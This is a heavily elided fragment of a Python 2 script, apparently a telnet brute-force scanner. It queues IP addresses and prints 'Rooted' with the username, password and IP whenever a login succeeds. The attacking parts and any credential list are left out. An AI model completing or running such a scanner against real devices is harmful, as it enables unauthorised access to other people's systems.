...
for ip in ips:
	queue_count += 1
	stdout.write("\r[%d] Coded By @Itz_Visually" % queue_count)
	stdout.flush()
	queue.put(ip)
print "\n"
			...
			try:
				...
				if success == True:
					try:
						...
						print "\033[37m[\033[32m+\033[37m] \033[33mRooted \033[37m-> \033[32m%s\033[37m:\033[32m%s\033[37m:\033[33m%s\033[37m"%(username, password, self.ip)
						tn.close()
						break
					except:
						tn.close()
